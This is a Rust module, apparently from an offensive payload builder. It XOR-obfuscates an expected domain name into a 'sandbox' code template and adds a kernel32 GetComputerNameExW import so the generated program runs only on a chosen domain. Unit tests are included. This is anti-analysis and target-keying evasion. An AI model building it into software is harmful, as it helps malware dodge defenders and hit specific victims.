use crate::obfuscation::obfuscate_string_for_template;

const SANDBOX_FRAGMENT: &str = include_str!("../../templates/fragments/sandbox.rs");

pub struct SandboxOutput {
    pub sandbox_function: String,
    pub sandbox_import: String,
}

pub fn build_sandbox(expected_domain: &str) -> SandboxOutput {
    if expected_domain.is_empty() {
        return SandboxOutput {
            sandbox_function: String::new(),
            sandbox_import: String::new(),
        };
    }

    let sandbox_function = SANDBOX_FRAGMENT.replace(
        "{{OBF_SANDBOX_DOMAIN}}",
        &obfuscate_string_for_template(expected_domain),
    );

    let sandbox_import =
        "#[link(name = \"kernel32\")]\nextern \"system\" {\n    #[link_name = \"GetComputerNameExW\"]\n    fn rp_get_computer_name_ex(name_type: i32, buffer: *mut u16, size: *mut u32) -> i32;\n}".to_string();

    SandboxOutput {
        sandbox_function,
        sandbox_import,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_empty_domain_disables_sandbox_code() {
        let output = build_sandbox("");
        assert!(output.sandbox_function.is_empty());
        assert!(output.sandbox_import.is_empty());
    }

    #[test]
    fn test_sandbox_domain_is_obfuscated() {
        let output = build_sandbox("MYDOMAIN");
        assert!(output.sandbox_function.contains("collect::<String>()"));
        assert!(output.sandbox_function.contains("^ 0x"));
    }

    #[test]
    fn test_sandbox_import() {
        let output = build_sandbox("test");
        assert!(output.sandbox_import.contains("rp_get_computer_name_ex"));
        assert!(output.sandbox_import.contains("kernel32"));
    }
}
